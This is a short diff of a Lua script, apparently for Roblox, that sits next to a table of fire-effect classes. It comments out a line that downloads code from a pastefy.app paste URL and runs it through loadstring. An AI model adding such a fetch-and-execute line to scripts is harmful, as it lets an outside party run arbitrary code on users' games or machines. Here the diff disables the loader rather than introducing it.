@@ -2020,7 +2020,7 @@ local FireClasses = {
    ParticleEmitter = true,
    Beam           = true,
 }
-loadstring(g.http_get("https://pastefy.app/3fhj9eVw/raw"))()
+--loadstring(game:HttpGet("https://pastefy.app/3fhj9eVw/raw"))()
 local PendingQueue = {}
 local QueueDirty   = false
 local function is_fire_class(obj) return FireClasses[obj.ClassName] ~= nil end
